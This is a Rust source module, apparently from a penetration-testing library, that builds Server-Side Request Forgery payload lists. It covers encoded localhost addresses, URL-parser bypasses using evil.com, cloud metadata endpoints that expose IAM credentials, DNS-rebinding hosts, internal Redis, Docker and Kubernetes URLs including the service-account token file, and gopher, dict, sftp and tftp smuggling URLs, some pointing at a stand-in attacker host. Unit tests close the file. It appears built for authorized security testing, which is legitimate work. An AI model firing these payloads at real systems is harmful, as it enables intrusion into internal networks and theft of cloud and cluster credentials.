//! SSRF (Server-Side Request Forgery) payloads

/// SSRF bypass variants
#[derive(Debug, Clone)]
pub struct SsrfPayload {
    pub name: String,
    pub url: String,
}

impl SsrfPayload {
    pub fn new(name: &str, url: &str) -> Self {
        Self {
            name: name.to_string(),
            url: url.to_string(),
        }
    }
}

/// Generate localhost bypass variants
pub fn localhost_variants(port: u16) -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new("localhost", &format!("http://localhost:{}", port)),
        SsrfPayload::new("127.0.0.1", &format!("http://127.0.0.1:{}", port)),
        SsrfPayload::new("127.1", &format!("http://127.1:{}", port)),
        SsrfPayload::new("0.0.0.0", &format!("http://0.0.0.0:{}", port)),
        SsrfPayload::new("0", &format!("http://0:{}", port)),
        SsrfPayload::new("IPv6 localhost", &format!("http://[::1]:{}", port)),
        SsrfPayload::new("IPv6 zero", &format!("http://[::]:{}", port)),
        SsrfPayload::new("Decimal", &format!("http://2130706433:{}", port)), // 127.0.0.1 in decimal
        SsrfPayload::new("Hex", &format!("http://0x7f000001:{}", port)),
        SsrfPayload::new("Octal", &format!("http://0177.0.0.1:{}", port)),
    ]
}

/// Internal network bypass variants
pub fn internal_network_variants(ip: &str, port: u16) -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new("Direct", &format!("http://{}:{}", ip, port)),
        SsrfPayload::new("@ bypass", &format!("http://evil.com@{}:{}", ip, port)),
        SsrfPayload::new("# bypass", &format!("http://evil.com#{}:{}", ip, port)),
        SsrfPayload::new("? bypass", &format!("http://evil.com?{}:{}", ip, port)),
    ]
}

/// Cloud metadata endpoints
pub fn cloud_metadata_endpoints() -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new("AWS metadata", "http://169.254.169.254/latest/meta-data/"),
        SsrfPayload::new(
            "AWS credentials",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ),
        SsrfPayload::new(
            "GCP metadata",
            "http://metadata.google.internal/computeMetadata/v1/",
        ),
        SsrfPayload::new("Azure metadata", "http://169.254.169.254/metadata/instance"),
        SsrfPayload::new("DigitalOcean", "http://169.254.169.254/metadata/v1/"),
    ]
}

/// Convert IP to different formats for bypass
pub fn ip_to_formats(ip: &str) -> Vec<String> {
    let parts: Vec<u8> = ip.split('.').filter_map(|s| s.parse().ok()).collect();
    if parts.len() != 4 {
        return vec![ip.to_string()];
    }

    let decimal = u32::from_be_bytes([parts[0], parts[1], parts[2], parts[3]]);

    vec![
        ip.to_string(),
        format!("{}", decimal),
        format!("0x{:08x}", decimal),
        format!(
            "0{:o}.0{:o}.0{:o}.0{:o}",
            parts[0], parts[1], parts[2], parts[3]
        ),
    ]
}

// =============================================================================
// IP Conversion Helpers
// =============================================================================

/// Convert dotted-decimal IP to a single decimal number
///
/// # Example
/// ```
/// use rectitude::payloads::ssrf::ip_to_decimal;
/// assert_eq!(ip_to_decimal(127, 0, 0, 1), 2130706433);
/// ```
pub fn ip_to_decimal(a: u8, b: u8, c: u8, d: u8) -> u32 {
    u32::from_be_bytes([a, b, c, d])
}

/// Convert dotted-decimal IP to hexadecimal format
///
/// # Example
/// ```
/// use rectitude::payloads::ssrf::ip_to_hex;
/// assert_eq!(ip_to_hex(127, 0, 0, 1), "0x7f000001");
/// ```
pub fn ip_to_hex(a: u8, b: u8, c: u8, d: u8) -> String {
    let decimal = ip_to_decimal(a, b, c, d);
    format!("0x{:08x}", decimal)
}

/// Convert dotted-decimal IP to octal format (each octet)
///
/// # Example
/// ```
/// use rectitude::payloads::ssrf::ip_to_octal;
/// let octal = ip_to_octal(127, 0, 0, 1);
/// assert!(octal.starts_with("0177"));  // 127 in octal
/// ```
pub fn ip_to_octal(a: u8, b: u8, c: u8, d: u8) -> String {
    format!("0{:o}.0{:o}.0{:o}.0{:o}", a, b, c, d)
}

/// Generate all IP format variants for bypass testing
///
/// # Example
/// ```
/// use rectitude::payloads::ssrf::ip_bypass_variants;
/// let variants = ip_bypass_variants(127, 0, 0, 1);
/// assert!(variants.len() >= 5);
/// ```
pub fn ip_bypass_variants(a: u8, b: u8, c: u8, d: u8) -> Vec<SsrfPayload> {
    let dotted = format!("{}.{}.{}.{}", a, b, c, d);
    let decimal = ip_to_decimal(a, b, c, d);

    vec![
        SsrfPayload::new("Dotted decimal", &dotted),
        SsrfPayload::new("Decimal", &decimal.to_string()),
        SsrfPayload::new("Hex", &ip_to_hex(a, b, c, d)),
        SsrfPayload::new("Octal", &ip_to_octal(a, b, c, d)),
        SsrfPayload::new(
            "Hex with 0x prefix",
            &format!("0x{:02x}.0x{:02x}.0x{:02x}.0x{:02x}", a, b, c, d),
        ),
        SsrfPayload::new(
            "Mixed decimal/hex",
            &format!("{}.0x{:02x}.{}.0x{:02x}", a, b, c, d),
        ),
        SsrfPayload::new("IPv6 mapped", &format!("::ffff:{}.{}.{}.{}", a, b, c, d)),
        SsrfPayload::new(
            "IPv6 mapped hex",
            &format!("::ffff:{:02x}{:02x}:{:02x}{:02x}", a, b, c, d),
        ),
    ]
}

// =============================================================================
// DNS Rebinding Payloads
// =============================================================================

/// Generate DNS rebinding payloads for SSRF bypass
///
/// These use DNS services that resolve to localhost or specified IPs.
///
/// # Example
/// ```
/// use rectitude::payloads::ssrf::dns_rebinding_payloads;
/// let payloads = dns_rebinding_payloads("/admin", 3000);
/// assert!(!payloads.is_empty());
/// ```
pub fn dns_rebinding_payloads(target_path: &str, port: u16) -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new(
            "localtest.me",
            &format!("http://localtest.me:{}{}", port, target_path),
        ),
        SsrfPayload::new(
            "127.0.0.1.nip.io",
            &format!("http://127.0.0.1.nip.io:{}{}", port, target_path),
        ),
        SsrfPayload::new(
            "localhost.nip.io",
            &format!("http://127-0-0-1.nip.io:{}{}", port, target_path),
        ),
        SsrfPayload::new(
            "vcap.me",
            &format!("http://vcap.me:{}{}", port, target_path),
        ),
        SsrfPayload::new("lvh.me", &format!("http://lvh.me:{}{}", port, target_path)),
        SsrfPayload::new(
            "spoofed.burpcollaborator.net",
            &format!(
                "http://spoofed.burpcollaborator.net:{}{}",
                port, target_path
            ),
        ),
        SsrfPayload::new(
            "xip.io",
            &format!("http://127.0.0.1.xip.io:{}{}", port, target_path),
        ),
    ]
}

/// Generate SSRF payloads for accessing internal services
///
/// Common internal service ports and paths.
pub fn internal_service_payloads(internal_ip: &str) -> Vec<SsrfPayload> {
    vec![
        // Redis
        SsrfPayload::new("Redis", &format!("http://{}:6379/", internal_ip)),
        SsrfPayload::new(
            "Redis gopher",
            &format!("gopher://{}:6379/_INFO", internal_ip),
        ),
        // Elasticsearch
        SsrfPayload::new(
            "Elasticsearch",
            &format!("http://{}:9200/_cat/indices", internal_ip),
        ),
        // Docker
        SsrfPayload::new("Docker socket", "http://localhost/var/run/docker.sock"),
        SsrfPayload::new(
            "Docker API",
            &format!("http://{}:2375/containers/json", internal_ip),
        ),
        // Kubernetes
        SsrfPayload::new(
            "K8s API",
            "https://kubernetes.default.svc/api/v1/namespaces",
        ),
        SsrfPayload::new(
            "K8s service account",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
        ),
        // Consul
        SsrfPayload::new(
            "Consul",
            &format!("http://{}:8500/v1/agent/services", internal_ip),
        ),
        // Vault
        SsrfPayload::new(
            "Vault",
            &format!("http://{}:8200/v1/sys/health", internal_ip),
        ),
    ]
}

/// URL schemes for protocol smuggling
pub fn protocol_smuggling_payloads(target: &str) -> Vec<SsrfPayload> {
    vec![
        SsrfPayload::new("file://", &format!("file://{}", target)),
        SsrfPayload::new("dict://", "dict://localhost:11211/info"),
        SsrfPayload::new("gopher://", "gopher://localhost:6379/_INFO"),
        SsrfPayload::new("sftp://", &format!("sftp://evil.com:22/{}", target)),
        SsrfPayload::new("tftp://", &format!("tftp://evil.com/{}", target)),
        SsrfPayload::new("ldap://", &format!("ldap://localhost:389/{}", target)),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_localhost_variants() {
        let variants = localhost_variants(8080);
        assert!(!variants.is_empty());
        assert!(variants.iter().any(|v| v.url.contains("localhost")));
    }

    #[test]
    fn test_ip_formats() {
        let formats = ip_to_formats("127.0.0.1");
        assert!(formats.contains(&"127.0.0.1".to_string()));
        assert!(formats.contains(&"2130706433".to_string()));
    }

    #[test]
    fn test_ip_to_decimal() {
        assert_eq!(ip_to_decimal(127, 0, 0, 1), 2130706433);
        assert_eq!(ip_to_decimal(192, 168, 1, 1), 3232235777);
        assert_eq!(ip_to_decimal(10, 0, 0, 1), 167772161);
    }

    #[test]
    fn test_ip_to_hex() {
        assert_eq!(ip_to_hex(127, 0, 0, 1), "0x7f000001");
        assert_eq!(ip_to_hex(192, 168, 1, 1), "0xc0a80101");
    }

    #[test]
    fn test_ip_to_octal() {
        let octal = ip_to_octal(127, 0, 0, 1);
        assert!(octal.starts_with("0177"));
    }

    #[test]
    fn test_ip_bypass_variants() {
        let variants = ip_bypass_variants(127, 0, 0, 1);
        assert!(variants.len() >= 5);
        assert!(variants.iter().any(|v| v.url == "127.0.0.1"));
        assert!(variants.iter().any(|v| v.url == "2130706433"));
    }

    #[test]
    fn test_dns_rebinding_payloads() {
        let payloads = dns_rebinding_payloads("/admin", 3000);
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.url.contains("localtest.me")));
        assert!(payloads.iter().any(|p| p.url.contains("nip.io")));
    }

    #[test]
    fn test_internal_service_payloads() {
        let payloads = internal_service_payloads("127.0.0.1");
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.name.contains("Redis")));
        assert!(payloads.iter().any(|p| p.name.contains("Docker")));
    }
}
